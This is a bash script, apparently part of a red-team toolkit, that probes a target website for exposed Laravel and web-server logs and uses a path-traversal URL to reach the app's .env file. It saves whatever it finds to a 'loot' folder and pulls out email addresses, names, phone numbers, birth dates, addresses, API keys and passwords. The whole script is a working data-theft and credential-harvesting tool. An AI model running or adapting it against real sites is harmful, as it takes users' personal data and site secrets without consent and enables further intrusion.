#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"
parse_common_args "$@"
: "${WS:=$HOME/redteam-runs/probe}"
mkdir -p "$WS/loot"
F="$WS/exploit/findings-raw.md"
URL="$(target_url)"

LOGS=("${EXTRA_ARGS[@]:-}")
if [[ ${#LOGS[@]} -eq 0 || -z "${LOGS[0]:-}" ]]; then
  LOGS=(
    "/storage/logs/laravel.log"
    "/ppc/storage/logs/laravel.log"
    "/storage/logs/laravel-$(date +%Y-%m-%d).log"
    "/var/log/apache2/error.log"
    "/logs/error.log"
    "/vendor/phpunit/phpunit/src/Util/PHP/../../../../../.env"
  )
fi

echo "## log/PII extraction ($(date -u +%FT%TZ)) target=$URL" >> "$F"

for lp in "${LOGS[@]}"; do
  code=$(http_code "$URL$lp")
  if [[ "$code" == "200" ]]; then
    f="$WS/loot/log_$(echo "$lp" | tr '/.' '__').txt"
    http_get "$URL$lp" --max-time 60 > "$f" 2>/dev/null || true
    sz=$(wc -c < "$f")
    echo "**log exposure** $lp → 200 (${sz}B) saved" >> "$F"
    grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "$f" 2>/dev/null | \
      sort -u >> "$WS/loot/pii_emails.txt" || true
    grep -oE "\"?(user_full_name|full_name|name|phone|mobile_no|contact_number|user_dob|dob|address)\"?\"?\\s*[:=]\\s*\"?[^\"]{1,80}" "$f" 2>/dev/null | \
      head -500 >> "$WS/loot/pii_fields.txt" || true
    grep -oiE "(api[_-]?key|secret|password|APP_KEY)[\"']?\\s*[:=]\\s*[\"']?[A-Za-z0-9+/=_-]{8,}" "$f" 2>/dev/null | \
      head -100 >> "$WS/loot/log_secrets.txt" || true
  fi
  throttle
done

sort -u "$WS/loot/pii_emails.txt" -o "$WS/loot/pii_emails.txt" 2>/dev/null || true
[[ -s "$WS/loot/pii_emails.txt" ]] && echo "→ PII emails: loot/pii_emails.txt ($(wc -l < "$WS/loot/pii_emails.txt") unique)" >> "$F"

logcheck "log_pii_extract" "$WS/loot"
